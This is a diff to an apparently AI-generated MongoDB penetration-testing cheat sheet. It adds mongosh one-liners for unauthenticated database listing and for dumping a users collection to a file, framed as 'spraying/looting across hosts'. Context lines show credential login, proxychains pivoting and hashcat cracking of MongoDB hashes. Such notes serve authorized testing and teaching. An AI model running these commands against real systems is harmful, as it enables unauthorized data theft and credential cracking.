@@ -52,6 +52,17 @@ mongo 192.168.1.10:27017/admin -u admin -p Password
 proxychains mongosh 192.168.1.10
 ```
 
+**Non-interactive (`--eval`)** — run one statement and exit; the scriptable form for spraying/looting across hosts:
+
+```bash
+# Quick recon one-liner (no auth)
+mongosh 192.168.1.10 --quiet --eval "db.adminCommand({listDatabases:1}).databases"
+
+# Dump a collection straight to stdout / a file
+mongosh "mongodb://192.168.1.10:27017/targetdb" --quiet \
+  --eval "db.users.find().forEach(printjson)" > users.json
+```
+
 ---
 
 ## Reconnaissance
@@ -245,5 +256,5 @@ hashcat -m 24100 mongo_hashes.txt /usr/share/wordlists/rockyou.txt
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-22*
+*Updated: 2026-09-29*
 *Model: claude-opus-4-8*
